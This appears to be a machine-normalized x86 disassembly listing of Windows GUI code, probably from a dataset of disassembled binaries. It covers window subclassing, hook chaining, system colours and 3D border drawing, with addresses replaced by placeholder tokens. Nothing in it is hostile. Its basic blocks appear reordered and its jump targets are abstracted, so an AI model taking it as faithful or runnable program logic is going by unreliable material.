jle r-xdata
xor eax eax
retn
mov ecx rw-data
mov eax 0x1
retn
add ecx 0x14
inc edx
cmp edx [ rw-data ]
jl r-xdata
cmp [ ecx ] eax
je r-xdata
sub_41a7d0
push ebx
push esi
push edi
push ebp
xor ebp ebp
call [ GetCurrentThreadId@IAT ]
mov ebx eax
push rw-data
call [ EnterCriticalSection@IAT ]
cmp [ rw-data ] ebp
jle r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
mov eax 0x1
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp * 4 ]
cmp [ eax + eax * 4 + rw-data ] ebx
lea esi [ eax + eax * 4 ]
jne r-xdata
inc ebp
cmp ebp [ rw-data ]
jl r-xdata
mov eax [ esi + rw-data ]
dec eax
mov [ esi + rw-data ] eax
jne r-xdata
mov eax [ esi + rw-data ]
push eax
call [ UnhookWindowsHookEx@IAT ]
dec [ rw-data ]
cmp ebp [ rw-data ]
jge r-xdata
lea edi [ esi + rw-data ]
lea eax [ edi + 0x14 ]
mov ecx 0x5
mov esi eax
inc ebp
[ edi ] [ esi ]
mov edi eax
cmp ebp [ rw-data ]
jl r-xdata
sub_41a8a0
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
push ebp
jne r-xdata
mov esi [ esp + 0x14 ]
push 0xfffffffc
push esi
call [ GetWindowLongA@IAT ]
xor ecx ecx
mov edi [ SetWindowLongA@IAT ]
mov ebx [ RemovePropA@IAT ]
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
inc ecx
cmp ecx 0x6
jl r-xdata
push ecx
push esi
call sub_419f70
add esp 0x8
mov ebp eax
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call ebx
push ebp
push 0xfffffffc
push esi
call edi
xor eax eax
mov ecx 0x10
lea edx [ ecx + ecx * 2 ]
cmp [ edx * 8 + rw-data ] eax
jne r-xdata
jne r-xdata
push 0x5
push esi
mov esi [ GetWindow@IAT ]
call esi
mov edi eax
test edi edi
je r-xdata
cmp eax sub_41b450
jne r-xdata
mov eax 0x1
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
push edi
call sub_41a8a0
push 0x2
push edi
call esi
mov edi eax
test edi edi
jne r-xdata
xor eax eax
mov edi [ GetPropA@IAT ]
mov ax [ rw-data ]
push eax
push esi
call edi
test eax eax
jne r-xdata
push ecx
push esi
call sub_419f70
add esp 0x8
mov ebp eax
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call ebx
push ebp
push 0xfffffffc
push esi
call edi
jmp r-xdata
push 0x1
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call [ SetPropA@IAT ]
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call edi
test eax eax
jne r-xdata
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call edi
test eax eax
je r-xdata
sub_41a9b0
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
mov edi [ esp + 0x14 ]
test edi edi
jl r-xdata
xor eax eax
pop edi
pop esi
pop ebx
retn 0x8
xor eax eax
pop edi
pop esi
pop ebx
retn 0x8
cmp edi 0x6
jg r-xdata
mov esi [ esp + 0x10 ]
push esi
call sub_419f50
add esp 0x4
test eax eax
je r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
mov ebx eax
push esi
call [ GetParent@IAT ]
push eax
push 0x0
push 0xffff
mov eax edi
shl eax 0x5
push ebx
push esi
call [ eax + r--data ]
add esp 0x14
cmp eax 0x1
jne r-xdata
xor eax eax
pop edi
pop esi
pop ebx
retn 0x8
mov eax 0x1
pop edi
pop esi
pop ebx
retn 0x8
lea eax [ edi + edi * 2 ]
mov ecx [ eax * 8 + rw-data ]
push ecx
push esi
call sub_419fc0
add esp 0x8
sub_41aa40
sub esp 0x4
push ebx
push esi
mov esi [ esp + 0x10 ]
push edi
push esi
call sub_419f50
add esp 0x4
test eax eax
jne r-xdata
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call [ GetPropA@IAT ]
test eax eax
jne r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x18 ]
push eax
push 0x0
push ecx
push esi
call sub_41bb50
add esp 0x10
pop edi
pop esi
pop ebx
add esp 0x4
retn
pop edi
pop esi
pop ebx
add esp 0x4
retn
lea ebx [ esp + 0xc ]
mov edi [ SendMessageA@IAT ]
mov [ esp + 0xc ] 0x29a
push ebx
push 0x0
push 0x1944
push esi
call edi
cmp [ esp + 0xc ] 0x29a
jne r-xdata
push ebx
push 0x0
push 0x1943
push esi
call edi
cmp [ esp + 0xc ] 0x29a
jne r-xdata
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call [ RemovePropA@IAT ]
mov ax [ esp + 0x18 ]
mov ecx [ esp + 0x1c ]
push ecx
push 0x0
push eax
push esi
call sub_41bb50
add esp 0x10
sub_41aaf0
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
push ebp
jne r-xdata
mov eax [ esp + 0x14 ]
push 0x5
push eax
mov ebp [ GetWindow@IAT ]
call ebp
mov edi eax
test edi edi
je r-xdata
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
retn 0x8
mov eax 0x1
pop ebp
pop edi
pop esi
pop ebx
retn 0x8
mov si [ esp + 0x18 ]
push 0x2
push edi
call ebp
mov edi eax
test edi edi
jne r-xdata
push edi
push esi
push ebx
call sub_41aa40
add esp 0xc
push 0x2
push ebx
call ebp
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
push esi
push edi
call sub_41aa40
add esp 0xc
push 0x5
push edi
call ebp
mov ebx eax
test ebx ebx
je r-xdata
sub_41ab70
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
push ebp
jne r-xdata
mov edi [ esp + 0x14 ]
push 0x5
push edi
mov esi [ GetWindow@IAT ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
retn 0x8
push sub_41b450
push edi
call sub_419fc0
add esp 0x8
mov eax 0x1
pop ebp
pop edi
pop esi
pop ebx
retn 0x8
mov bp [ esp + 0x18 ]
push 0x0
push 0x0
push ebp
push ebx
call sub_41bb50
add esp 0x10
push 0x2
push ebx
call esi
mov ebx eax
test ebx ebx
jne r-xdata
sub_41abe0
cmp [ rw-data ] 0x0
push esi
je r-xdata
xor eax eax
pop esi
retn 0xc
mov eax [ esp + 0x8 ]
cmp eax 0x134
jb r-xdata
cmp eax 0x137
je r-xdata
cmp eax 0x134
jne r-xdata
mov esi [ esp + 0xc ]
mov eax [ rw-data ]
push eax
push esi
call [ SetTextColor@IAT ]
mov ecx [ rw-data ]
push ecx
push esi
call [ SetBkColor@IAT ]
mov eax [ rw-data ]
pop esi
retn 0xc
cmp [ rw-data ] 0x35f
jae r-xdata
xor eax eax
pop esi
retn 0xc
mov esi [ esp + 0x10 ]
push 0x5
push esi
call [ GetWindow@IAT ]
test eax eax
je r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
and al 0x3
cmp al 0x3
jne r-xdata
sub_41aca0
sub esp 0x3c
cmp [ esp + 0x50 ] 0x0
push ebx
push esi
push edi
push ebp
je r-xdata
mov esi [ esp + 0x50 ]
push 0x6
push esi
call sub_419f70
add esp 0x8
xor eax eax
mov esi [ esp + 0x50 ]
jmp r-xdata
mov eax [ esp + 0x5c ]
mov edx [ esp + 0x58 ]
push eax
push edx
push esi
call [ DefWindowProcA@IAT ]
mov edx [ esp + 0x5c ]
mov ebx [ esp + 0x58 ]
push edx
push ebx
push esi
push eax
call [ CallWindowProcA@IAT ]
jmp r-xdata
mov ecx [ esp + 0x5c ]
test eax eax
push ecx
je r-xdata
push esi
call [ IsIconic@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x3c
retn 0x14
cmp [ rw-data ] 0x0
mov [ esp + 0x10 ] eax
jne r-xdata
mov [ esp + 0x14 ] 0x1
lea eax [ esp + 0x14 ]
push eax
push 0x0
push 0x11ef
push esi
call [ SendMessageA@IAT ]
push 0xfffffff0
mov ebp [ GetWindowLongA@IAT ]
push esi
call ebp
cmp [ esp + 0x14 ] 0x0
je r-xdata
mov eax [ esp + 0x10 ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x3c
retn 0x14
mov eax [ esp + 0x10 ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x3c
retn 0x14
mov ecx eax
and ecx 0x10400080
cmp ecx 0x10400080
jne r-xdata
and eax 0xc00000
mov ebx [ rw-data ]
sub eax 0xc00000
cmp eax 0x1
push esi
sbb ebp ebp
neg ebp
cmp ebp 0x1
sbb eax eax
inc eax
sub ebx eax
call [ GetWindowDC@IAT ]
mov edi eax
lea eax [ esp + 0x1c ]
push eax
push esi
call [ GetWindowRect@IAT ]
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x20 ]
sub [ esp + 0x24 ] ecx
push 0xf
lea eax [ esp + 0x20 ]
push 0x7
sub [ esp + 0x30 ] edx
push 0x2
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x28 ] 0x0
push eax
push edi
call sub_41a280
lea ecx [ esp + 0x30 ]
add esp 0x14
push 0xffffffff
push 0xffffffff
push ecx
call [ InflateRect@IAT ]
lea ecx [ esp + 0x1c ]
push 0xf
push 0x2
push 0x0
push ecx
push edi
call sub_41a280
lea ecx [ esp + 0x30 ]
add esp 0x14
push 0xffffffff
push 0xffffffff
push ecx
call [ InflateRect@IAT ]
mov ecx [ rw-data ]
push ecx
push edi
call [ SelectObject@IAT ]
lea ecx [ esp + 0x2c ]
mov [ esp + 0x18 ] eax
lea eax [ esp + 0x1c ]
mov edx [ eax ]
mov [ ecx ] edx
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x8 ]
mov eax [ eax + 0xc ]
push ecx
push edi
mov [ ecx + 0x8 ] edx
mov [ ecx + 0xc ] eax
mov eax [ esp + 0x24 ]
add eax [ rw-data ]
mov [ esp + 0x3c ] eax
call sub_41a250
mov eax [ esp + 0x2c ]
lea ecx [ esp + 0x34 ]
sub eax [ esp + 0x24 ]
add esp 0x8
sub eax [ rw-data ]
push 0x0
push eax
push ecx
call [ OffsetRect@IAT ]
lea ecx [ esp + 0x2c ]
push ecx
push edi
call sub_41a250
mov eax [ esp + 0x24 ]
add esp 0x8
add eax [ rw-data ]
mov [ esp + 0x2c ] eax
mov eax [ esp + 0x24 ]
sub eax [ rw-data ]
lea ecx [ esp + 0x2c ]
mov [ esp + 0x34 ] eax
push ecx
mov eax [ esp + 0x34 ]
push edi
add eax ebx
mov [ esp + 0x40 ] eax
call sub_41a250
add esp 0x8
test ebp ebp
je r-xdata
mov eax [ esp + 0x28 ]
lea ecx [ esp + 0x2c ]
sub eax [ esp + 0x20 ]
push ecx
sub eax [ rw-data ]
push edi
add [ esp + 0x38 ] eax
mov eax [ esp + 0x38 ]
add eax [ rw-data ]
mov [ esp + 0x40 ] eax
call sub_41a250
mov ecx [ esp + 0x20 ]
add esp 0x8
push ecx
push edi
call [ SelectObject@IAT ]
push edi
push esi
call [ ReleaseDC@IAT ]
mov ebp [ esp + 0x30 ]
lea edx [ esp + 0x2c ]
lea ecx [ esp + 0x3c ]
mov eax [ edx ]
add ebx [ esp + 0x30 ]
mov [ ecx ] eax
mov eax [ edx + 0x8 ]
mov [ ecx + 0x4 ] ebp
mov edx [ edx + 0xc ]
mov [ ecx + 0x8 ] eax
mov eax [ rw-data ]
push 0xf
add eax ebx
push 0x0
push 0x2
mov [ ecx + 0xc ] edx
lea ecx [ esp + 0x48 ]
mov [ esp + 0x4c ] ebx
mov [ esp + 0x54 ] eax
push ecx
push edi
call sub_41a280
add esp 0x14
sub_41af50
sub esp 0xc
cmp [ rw-data ] 0x0
push esi
push edi
je r-xdata
pop edi
pop esi
add esp 0xc
retn
push rw-data
call [ EnterCriticalSection@IAT ]
lea eax [ esp + 0x8 ]
push 0x9
push eax
mov esi [ GetProfileStringA@IAT ]
mov [ rw-data ] 0x1e
push rw-data
push rw-data
push rw-data
call esi
lea ecx [ esp + 0x8 ]
push rw-data
push ecx
mov edi [ lstrcmpiA@IAT ]
call edi
test eax eax
jne r-xdata
lea eax [ esp + 0x8 ]
push 0x9
push eax
push rw-data
push rw-data
push rw-data
call esi
lea eax [ esp + 0x8 ]
push rw-data
push eax
call edi
test eax eax
jne r-xdata
mov [ rw-data ] 0x1f
push rw-data
call [ LeaveCriticalSection@IAT ]
mov [ rw-data ] 0x1f
sub_41aff0
sub esp 0x28
push ebx
push esi
push edi
push rw-data
call [ EnterCriticalSection@IAT ]
push 0x0
call [ GetDC@IAT ]
mov ebx eax
push 0xc
push ebx
mov esi [ GetDeviceCaps@IAT ]
call esi
mov edi eax
push 0xe
push ebx
call esi
imul edi eax
mov eax 0x1
cmp edi 0x4
jge r-xdata
push 0x1
mov edi [ GetSystemMetrics@IAT ]
mov [ rw-data ] eax
call edi
cmp eax 0x15e
jne r-xdata
xor eax eax
push ebx
push 0x0
call [ ReleaseDC@IAT ]
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
call edi
cmp eax 0x280
jne r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
mov eax [ rw-data ]
pop edi
pop esi
pop ebx
add esp 0x28
retn
push rw-data
mov esi [ GlobalAddAtomA@IAT ]
call esi
mov [ rw-data ] ax
test ax ax
jne r-xdata
mov [ rw-data ] 0x0
push rw-data
call esi
mov [ rw-data ] ax
test ax ax
je r-xdata
mov [ rw-data ] 0x0
push rw-data
call esi
mov [ rw-data ] ax
push rw-data
call esi
cmp [ rw-data ] 0x0
mov [ rw-data ] ax
je r-xdata
xor eax eax
pop edi
mov [ rw-data ] 0x0
pop esi
pop ebx
add esp 0x28
retn
test ax ax
je r-xdata
push rw-data
call esi
mov [ rw-data ] ax
push rw-data
call esi
cmp [ rw-data ] 0x0
mov [ rw-data ] ax
je r-xdata
xor eax eax
pop edi
mov [ rw-data ] 0x0
pop esi
pop ebx
add esp 0x28
retn
test ax ax
je r-xdata
push rw-data
call esi
mov [ rw-data ] ax
test ax ax
je r-xdata
push 0x2a
call edi
mov [ rw-data ] al
call sub_41af50
push 0x1
call sub_41b2c0
add esp 0x4
test eax eax
je r-xdata
mov ebx rw-data
mov esi r--data
mov edi [ GetClassInfoA@IAT ]
mov eax [ esi ]
lea edx [ esi - 0x14 ]
mov [ ebx ] eax
lea ecx [ esp + 0xc ]
push ecx
add ebx 0x18
push edx
add esi 0x20
push 0x0
call edi
mov ecx [ esp + 0x10 ]
cmp esi r--data
mov [ ebx - 0x14 ] ecx
jb r-xdata
lea eax [ esp + 0xc ]
push eax
push 0x8002
push 0x0
call edi
test eax eax
je r-xdata
mov eax [ DefDlgProcA@IAT ]
mov [ rw-data ] eax
jmp r-xdata
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
jmp r-xdata
sub_41b1e0
push esi
push rw-data
call [ EnterCriticalSection@IAT ]
mov eax rw-data
add eax 0x18
cmp eax rw-data
jb r-xdata
mov [ eax ] 0x0
cmp [ eax ] 0x0
je r-xdata
call sub_41a220
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ GlobalDeleteAtom@IAT ]
mov ax [ rw-data ]
mov esi [ GlobalDeleteAtom@IAT ]
push eax
call esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ax [ rw-data ]
push eax
call esi
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ax [ rw-data ]
push eax
call esi
cmp [ rw-data ] 0x0
je r-xdata
mov ax [ rw-data ]
push eax
call esi
cmp [ rw-data ] 0x0
je r-xdata
mov ax [ rw-data ]
push eax
call esi
cmp [ rw-data ] 0x0
je r-xdata
mov ax [ rw-data ]
push eax
call esi
mov [ rw-data ] 0x0
push rw-data
call [ LeaveCriticalSection@IAT ]
pop esi
retn
mov ax [ rw-data ]
push eax
call esi
sub_41b2c0
sub esp 0x30
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
xor si si
mov ebx [ GetSysColor@IAT ]
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x30
retn
movzx edi si
inc si
xor eax eax
mov ax [ edi * 2 + r--data ]
push eax
call ebx
cmp si 0x8
mov [ esp + edi * 4 + 0x1c ] eax
jb r-xdata
cmp [ rw-data ] 0x300
jne r-xdata
cmp [ esp + 0x34 ] 0x0
je r-xdata
mov [ esp + 0x1c ] 0xffffff
cmp [ esp + 0x20 ] 0x808080
mov [ esp + 0x34 ] 0xc0c0c0
je r-xdata
mov eax [ esp + 0x34 ]
cmp [ esp + 0x20 ] eax
jne r-xdata
cmp [ esp + 0x40 ] 0x0
jne r-xdata
mov [ esp + 0x34 ] 0x808080
mov eax [ esp + 0x38 ]
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x1c ]
push eax
mov eax [ esp + 0x28 ]
push ecx
mov ecx [ esp + 0x28 ]
push edx
mov edx [ esp + 0x3c ]
push eax
push ecx
mov eax [ rw-data ]
xor si si
push edx
push 0x67c7
push eax
call sub_41d4f0
mov edi [ CreateSolidBrush@IAT ]
mov [ esp + 0xc ] eax
mov esi rw-data
lea edi [ esp + 0x1c ]
mov ecx 0x20
[ esi ] [ edi ]
jne r-xdata
movzx eax si
inc si
mov ecx [ esp + eax * 4 + 0x1c ]
lea ebx [ eax * 4 ]
push ecx
call edi
cmp si 0x3
mov [ esp + ebx + 0x10 ] eax
jb r-xdata
xor eax eax
xor ecx ecx
mov eax 0x1
pop edi
pop esi
pop ebx
add esp 0x30
retn
xor si si
inc ax
cmp ax 0x3
jb r-xdata
movzx eax si
inc si
lea ecx [ esp + eax * 4 + 0x10 ]
push ecx
call sub_41a200
add esp 0x4
cmp si 0x3
jb r-xdata
lea eax [ esp + 0xc ]
push eax
call sub_41a200
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x30
retn
movzx edx ax
cmp [ esp + edx * 4 + 0x10 ] ecx
je r-xdata
cmp [ esp + 0xc ] 0x0
je r-xdata
call sub_41a220
mov ebx [ esp + 0x14 ]
lea ecx [ esp + 0x10 ]
mov edx rw-data
lea esi [ esp + 0x1c ]
mov eax [ ecx ]
mov edi rw-data
mov ecx [ ecx + 0x8 ]
mov [ edx ] eax
mov [ edx + 0x4 ] ebx
mov [ edx + 0x8 ] ecx
mov ecx 0x8
[ edi ] [ esi ]
mov eax [ esp + 0xc ]
pop edi
pop esi
mov [ rw-data ] eax
mov eax 0x1
pop ebx
add esp 0x30
retn
sub_41b450
sub esp 0x18
push ebx
push esi
push edi
push ebp
mov edi [ esp + 0x30 ]
cmp edi 0x82
jne r-xdata
xor eax eax
mov esi [ esp + 0x2c ]
mov ax [ rw-data ]
push eax
push esi
call [ GetPropA@IAT ]
test eax eax
je r-xdata
mov ebp [ esp + 0x38 ]
push 0x6
mov ebx [ esp + 0x38 ]
push ebp
mov esi [ esp + 0x34 ]
push ebx
push edi
push esi
call sub_41a1a0
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
add esp 0x18
retn 0x10
cmp edi 0x86
ja r-xdata
mov ebp [ esp + 0x38 ]
mov ebx [ esp + 0x34 ]
push ebp
push ebx
push edi
push esi
push 0x6
push esi
call sub_419f70
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x18
retn 0x10
cmp edi 0x138
ja r-xdata
cmp edi 0x85
jae r-xdata
cmp edi 0x1943
jb r-xdata
cmp edi 0x132
jae r-xdata
cmp [ rw-data ] 0x35f
jae r-xdata
cmp edi 0xc
je r-xdata
mov ebx [ esp + 0x34 ]
mov ebp [ esp + 0x38 ]
cmp edi 0x1944
jbe r-xdata
lea eax [ esp + 0x18 ]
push 0x10
push eax
push esi
call [ GetClassNameA@IAT ]
lea ecx [ esp + 0x18 ]
push ecx
push rw-data
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
cmp edi 0x110
je r-xdata
mov ebp [ esp + 0x38 ]
mov ebx [ esp + 0x34 ]
push ebp
push ebx
push edi
push esi
push 0x6
push esi
call sub_419f70
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x18
retn 0x10
push esi
call [ IsIconic@IAT ]
test eax eax
jne r-xdata
mov ebp [ esp + 0x38 ]
mov eax 0x3ee
mov [ ebp ] 0x1
pop ebp
pop edi
pop esi
pop ebx
add esp 0x18
retn 0x10
jmp r-xdata
push 0x4
push esi
call [ GetWindowLongA@IAT ]
test eax eax
jne r-xdata
mov ebp [ esp + 0x38 ]
mov ebx [ esp + 0x34 ]
push ebp
lea eax [ edi + 0xcbf ]
push ebx
push eax
push esi
push 0x6
push esi
call sub_419f70
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
test eax eax
je r-xdata
push 0x6
push esi
call sub_419f70
mov [ esp + 0x1c ] eax
add esp 0x8
cmp [ rw-data ] 0x35f
jb r-xdata
jmp r-xdata
mov ebp [ esp + 0x38 ]
push 0x0
mov ebx [ esp + 0x38 ]
push ebp
push ebx
push edi
push esi
call sub_41aca0
pop ebp
pop edi
pop esi
pop ebx
add esp 0x18
retn 0x10
cmp eax 0xffff0000
jbe r-xdata
mov ebp [ esp + 0x38 ]
mov ebx [ esp + 0x34 ]
push ebp
jmp r-xdata
push ebp
cmp eax 0x1
jne r-xdata
mov [ esp + 0x10 ] 0x1
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
mov [ esp + 0x10 ] 0x0
test al 0x4
jne r-xdata
mov ebp [ esp + 0x38 ]
mov ebx [ esp + 0x34 ]
push ebp
push ebx
push edi
push esi
push eax
call [ CallWindowProcA@IAT ]
test eax eax
je r-xdata
cmp [ rw-data ] 0x30a
ja r-xdata
push ebx
push edi
call sub_41abe0
push ebp
push ebx
push edi
push esi
push 0x6
push esi
call sub_419f70
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x18
retn 0x10
pop ebp
pop edi
pop esi
pop ebx
add esp 0x18
retn 0x10
test eax eax
je r-xdata
jmp r-xdata
mov ebp [ esp + 0x38 ]
mov ebx [ esp + 0x34 ]
mov eax [ esp + 0x14 ]
push ebp
push ebx
push edi
push esi
push eax
call [ CallWindowProcA@IAT ]
cmp [ rw-data ] 0x35f
mov edi eax
jb r-xdata
push esi
call sub_41a8a0
mov ebp [ esp + 0x38 ]
mov ebx [ esp + 0x34 ]
mov eax [ esp + 0x14 ]
push ebp
push ebx
push edi
push esi
push eax
call [ CallWindowProcA@IAT ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x18
retn 0x10
lea eax [ esp + 0x10 ]
push eax
push 0x0
push 0x11f0
push esi
call [ SendMessageA@IAT ]
cmp [ esp + 0x10 ] 0x0
jne r-xdata
push ebp
lea eax [ edi + 0xcbf ]
push ebx
push eax
push esi
push 0x6
push esi
call sub_419f70
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
test eax eax
je r-xdata
cmp eax 0x1
jne r-xdata
mov ebp [ esp + 0x38 ]
mov ebx [ esp + 0x34 ]
push ebp
lea eax [ edi + 0xcbf ]
push ebx
push eax
push esi
push 0x6
push esi
call sub_419f70
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
test eax eax
je r-xdata
push 0xffff
push esi
call sub_41aaf0
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test al 0x4
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
add esp 0x18
retn 0x10
jmp r-xdata
sub_41b780
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_419f50
add esp 0x4
test eax eax
jne r-xdata
cmp [ rw-data ] 0x35f
jb r-xdata
xor eax eax
pop esi
retn
mov eax 0x1
pop esi
retn
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test al 0x4
je r-xdata
xor eax eax
pop esi
retn
sub_41b7c0
sub esp 0x4
push ebx
push esi
push edi
push ebp
call [ GetCurrentThreadId@IAT ]
mov esi eax
push rw-data
call [ EnterCriticalSection@IAT ]
cmp [ rw-data ] esi
je r-xdata
mov edi [ rw-data ]
push rw-data
call [ LeaveCriticalSection@IAT ]
mov esi [ esp + 0x18 ]
mov ebx [ esp + 0x20 ]
cmp esi 0x3
jne r-xdata
xor ecx ecx
cmp ecx [ rw-data ]
jge r-xdata
shl edi 0x2
push ebx
mov eax [ esp + 0x20 ]
mov ecx [ edi + edi * 4 + rw-data ]
push eax
push esi
push ecx
call [ CallNextHookEx@IAT ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn 0xc
mov ebp [ ebx ]
cmp [ ebp + 0x28 ] 0x8002
jne r-xdata
jne r-xdata
mov eax rw-data
lea eax [ edi * 4 ]
test [ eax + eax * 4 + rw-data ] 0x1
je r-xdata
cmp [ rw-data ] 0x20
jne r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
mov ebx [ esp + 0x20 ]
mov eax [ esp + 0x1c ]
mov esi [ esp + 0x18 ]
push ebx
push eax
push esi
push 0x0
call [ CallNextHookEx@IAT ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn 0xc
mov [ rw-data ] ecx
mov [ rw-data ] esi
add eax 0x14
inc ecx
cmp ecx [ rw-data ]
jl r-xdata
mov eax [ ebp + 0xc ]
push eax
call sub_41b780
add esp 0x4
test eax eax
jne r-xdata
mov eax [ esp + 0x1c ]
push sub_41b450
push eax
call sub_41a160
add esp 0x8
jmp r-xdata
cmp [ rw-data ] 0x35f
jb r-xdata
cmp [ eax ] esi
je r-xdata
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ esp + 0x1c ]
push eax
push 0x1
push 0xffff
push ecx
call sub_41bb50
add esp 0x10
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov [ esp + 0x10 ] 0x1
mov eax [ esp + 0x1c ]
push 0xfffffff0
push eax
mov ebp [ GetWindowLongA@IAT ]
call ebp
mov [ esp + 0x10 ] 0x0
test al 0x4
jne r-xdata
cmp ecx [ rw-data ]
cmp [ rw-data ] 0x18
je r-xdata
push sub_41b450
push ebp
call sub_419fc0
add esp 0x8
jmp r-xdata
mov ebp [ esp + 0x1c ]
lea eax [ esp + 0x10 ]
push eax
push 0x0
push 0x11f0
push ebp
call [ SendMessageA@IAT ]
cmp [ esp + 0x10 ] 0x0
je r-xdata
push eax
call [ GetParent@IAT ]
push eax
call sub_41b780
add esp 0x4
test eax eax
je r-xdata
sub_41b9a0
sub esp 0x10
cmp [ rw-data ] 0x35f
jb r-xdata
mov eax 0x1
add esp 0x10
retn
mov eax [ esp + 0x24 ]
test eax eax
je r-xdata
lea ecx [ esp ]
push 0x10
push ecx
push eax
call [ GetClassNameA@IAT ]
lea ecx [ esp ]
push r--data
push ecx
call [ lstrcmpA@IAT ]
cmp eax 0x1
sbb eax eax
add esp 0x10
inc eax
retn
sub_41b9f0
cmp [ rw-data ] 0x35f
jb r-xdata
cmp [ esp + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
mov eax 0x1
retn
mov eax [ esp + 0x14 ]
push 0xfffffff0
push eax
call [ GetWindowLongA@IAT ]
and eax 0x3
cmp eax 0x2
je r-xdata
xor eax eax
retn
cmp eax 0x3
je r-xdata
mov eax 0x1
retn
sub_41ba30
cmp [ rw-data ] 0x35f
push ebx
push esi
push edi
push ebp
jb r-xdata
mov eax [ esp + 0x18 ]
and eax 0x3
cmp eax 0x2
jne r-xdata
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x3
jne r-xdata
mov bx [ esp + 0x20 ]
cmp bx 0x1
jne r-xdata
mov bx [ esp + 0x20 ]
cmp bx 0x1
jne r-xdata
mov eax 0x1
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esp + 0x14 ]
push 0x5
push edi
call [ GetWindow@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esp + 0x14 ]
push 0x5
push edi
mov esi [ GetWindow@IAT ]
call esi
mov ebp eax
test ebp ebp
je r-xdata
mov eax 0x1
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax 0x1
pop ebp
pop edi
pop esi
pop ebx
retn
push edi
push ebx
push 0x4
push eax
call sub_41bb50
add esp 0x10
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
retn
push edi
push ebx
push 0x2
push ebp
call sub_41bb50
add esp 0x10
push 0x2
push ebp
call esi
test eax eax
je r-xdata
mov eax 0x1
pop ebp
pop edi
pop esi
pop ebx
retn
push edi
push ebx
push 0x4
push eax
call sub_41bb50
add esp 0x10
sub_41bb00
mov eax [ esp + 0x8 ]
and ax 0x1f
movzx ecx ax
cmp ecx 0x3
je r-xdata
xor eax eax
retn
mov ax [ esp + 0xc ]
test al 0x10
je r-xdata
test al 0x20
je r-xdata
cmp ecx 0x2
jle r-xdata
cmp ecx 0x4
jl r-xdata
mov eax 0x1
retn
cmp ecx 0xc
je r-xdata
cmp [ rw-data ] 0x35f
jae r-xdata
cmp ecx 0x9
jle r-xdata
cmp ecx 0x10
jl r-xdata
cmp ecx 0x12
jg r-xdata
sub_41bb50
sub esp 0x10
push ebx
push esi
mov esi [ esp + 0x1c ]
push edi
push ebp
push esi
call sub_419f50
add esp 0x4
test eax eax
je r-xdata
lea eax [ esp + 0x10 ]
push 0x10
push eax
xor ebp ebp
push esi
mov ebx r--data
call [ GetClassNameA@IAT ]
mov di [ esp + 0x28 ]
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
add esp 0x10
retn
add ebx 0x20
inc ebp
cmp ebx r--data
